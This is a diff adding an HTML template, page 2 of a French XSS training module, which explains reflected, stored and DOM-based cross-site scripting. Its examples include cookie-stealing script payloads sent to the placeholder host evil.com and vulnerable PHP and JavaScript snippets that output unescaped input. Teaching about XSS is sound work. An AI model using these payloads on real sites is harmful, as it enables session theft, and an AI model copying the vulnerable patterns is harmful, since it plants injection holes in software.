@@ -1,0 +1,197 @@
+{% extends "base.html" %}
+
+{% block title %}XSS - Types de XSS - TestZone{% endblock %}
+
+{% block extra_css %}
+<style>
+    .content-container {
+        max-width: 800px;
+        margin: 0 auto;
+    }
+
+    .page-header {
+        text-align: center;
+        margin-bottom: 2rem;
+        padding: 1.5rem;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+    }
+
+    .content-section {
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        padding: 2rem;
+        margin-bottom: 2rem;
+        line-height: 1.6;
+    }
+
+    .content-section h3 {
+        color: #00ff88;
+        margin-bottom: 1rem;
+        font-size: 1.3rem;
+    }
+
+    .content-section p {
+        margin-bottom: 1rem;
+        color: rgba(255, 255, 255, 0.9);
+    }
+
+    .code-block {
+        background: rgba(0, 0, 0, 0.3);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 5px;
+        padding: 1rem;
+        margin: 1rem 0;
+        font-family: 'Courier New', monospace;
+        color: #00ff88;
+        overflow-x: auto;
+    }
+
+    .type-card {
+        background: rgba(255, 255, 255, 0.05);
+        border: 1px solid rgba(255, 255, 255, 0.2);
+        border-radius: 8px;
+        padding: 1.5rem;
+        margin: 1rem 0;
+    }
+
+    .type-title {
+        color: #00ff88;
+        font-size: 1.2rem;
+        font-weight: bold;
+        margin-bottom: 1rem;
+    }
+
+    .navigation {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-top: 3rem;
+    }
+
+    .page-indicator {
+        color: rgba(255, 255, 255, 0.8);
+        font-size: 0.9rem;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="content-container">
+    <div class="page-header">
+        <h1 style="color: #00ff88; margin-bottom: 0.5rem;">
+            <i class="fas fa-code"></i> Module XSS
+        </h1>
+        <h2 style="color: #ffffff;">2. Types de Cross-Site Scripting</h2>
+    </div>
+
+    <div class="content-section">
+        <h3><i class="fas fa-list"></i> Classification des attaques XSS</h3>
+        <p>
+            Il existe trois types principaux d'attaques XSS, chacun ayant ses propres caractéristiques et méthodes d'exploitation. 
+            Comprendre ces différences est crucial pour identifier et prévenir ces vulnérabilités.
+        </p>
+    </div>
+
+    <div class="type-card">
+        <div class="type-title">
+            <i class="fas fa-reflect-horizontal"></i> 1. Reflected XSS (XSS Réfléchi)
+        </div>
+        <p>
+            Le XSS réfléchi est le type le plus courant. Le script malveillant est "réfléchi" par le serveur web 
+            dans la réponse HTTP immédiate. L'attaque n'est pas stockée de manière permanente.
+        </p>
+        <p><strong>Caractéristiques :</strong></p>
+        <ul style="color: rgba(255, 255, 255, 0.9); margin-left: 2rem;">
+            <li>Le payload est inclus dans la requête HTTP (URL, formulaire)</li>
+            <li>Exécution immédiate lors du chargement de la page</li>
+            <li>Nécessite que la victime clique sur un lien malveillant</li>
+            <li>Impact limité à la session de la victime</li>
+        </ul>
+        <p><strong>Exemple :</strong></p>
+        <div class="code-block">
+&lt;!-- URL malveillante --&gt;<br>
+http://site.com/search?q=&lt;script&gt;document.location='http://evil.com/steal.php?cookie='+document.cookie&lt;/script&gt;<br><br>
+&lt;!-- Code PHP vulnérable --&gt;<br>
+echo "Résultats pour : " . $_GET['q'];
+        </div>
+    </div>
+
+    <div class="type-card">
+        <div class="type-title">
+            <i class="fas fa-database"></i> 2. Stored XSS (XSS Stocké)
+        </div>
+        <p>
+            Le XSS stocké, aussi appelé XSS persistant, est considéré comme le plus dangereux. 
+            Le script malveillant est stocké de manière permanente sur le serveur cible.
+        </p>
+        <p><strong>Caractéristiques :</strong></p>
+        <ul style="color: rgba(255, 255, 255, 0.9); margin-left: 2rem;">
+            <li>Le payload est stocké dans la base de données</li>
+            <li>Affecte tous les utilisateurs qui consultent la page infectée</li>
+            <li>Persistant jusqu'à ce que le contenu soit supprimé</li>
+            <li>Impact plus large et plus durable</li>
+        </ul>
+        <p><strong>Exemple :</strong></p>
+        <div class="code-block">
+&lt;!-- Commentaire malveillant stocké en base --&gt;<br>
+"Super article ! &lt;script&gt;new Image().src='http://evil.com/log.php?c='+document.cookie&lt;/script&gt;"<br><br>
+&lt;!-- Affiché à tous les visiteurs --&gt;<br>
+&lt;div class="comment"&gt;&lt;?php echo $comment; ?&gt;&lt;/div&gt;
+        </div>
+    </div>
+
+    <div class="type-card">
+        <div class="type-title">
+            <i class="fas fa-code-branch"></i> 3. DOM-based XSS
+        </div>
+        <p>
+            Le XSS basé sur le DOM se produit entièrement côté client. Le script malveillant modifie 
+            l'environnement DOM dans le navigateur de la victime.
+        </p>
+        <p><strong>Caractéristiques :</strong></p>
+        <ul style="color: rgba(255, 255, 255, 0.9); margin-left: 2rem;">
+            <li>Exécution entièrement côté client</li>
+            <li>Le serveur ne voit jamais le payload malveillant</li>
+            <li>Exploitation via JavaScript légitime</li>
+            <li>Plus difficile à détecter par les WAF</li>
+        </ul>
+        <p><strong>Exemple :</strong></p>
+        <div class="code-block">
+&lt;!-- Code JavaScript vulnérable --&gt;<br>
+var pos = document.URL.indexOf("name=") + 5;<br>
+var name = document.URL.substring(pos, document.URL.length);<br>
+document.getElementById("welcome").innerHTML = "Bonjour " + name;<br><br>
+&lt;!-- URL d'attaque --&gt;<br>
+http://site.com/page.html#name=&lt;script&gt;alert('XSS')&lt;/script&gt;
+        </div>
+    </div>
+
+    <div class="content-section">
+        <h3><i class="fas fa-chart-bar"></i> Comparaison des types</h3>
+        <p>
+            Chaque type de XSS présente des défis différents pour la détection et la prévention :
+        </p>
+        <ul style="color: rgba(255, 255, 255, 0.9); margin-left: 2rem;">
+            <li><strong>Reflected XSS :</strong> Facile à détecter, impact limité mais très répandu</li>
+            <li><strong>Stored XSS :</strong> Plus difficile à exploiter mais impact maximal</li>
+            <li><strong>DOM-based XSS :</strong> Difficile à détecter, nécessite une analyse côté client</li>
+        </ul>
+    </div>
+
+    <div class="navigation">
+        <a href="/module/xss/page/1" class="btn btn-secondary">
+            <i class="fas fa-arrow-left"></i> Page précédente
+        </a>
+        
+        <div class="page-indicator">
+            Page 2 sur 4
+        </div>
+        
+        <a href="/module/xss/page/3" class="btn">
+            Page suivante <i class="fas fa-arrow-right"></i>
+        </a>
+    </div>
+</div>
+{% endblock %}
+
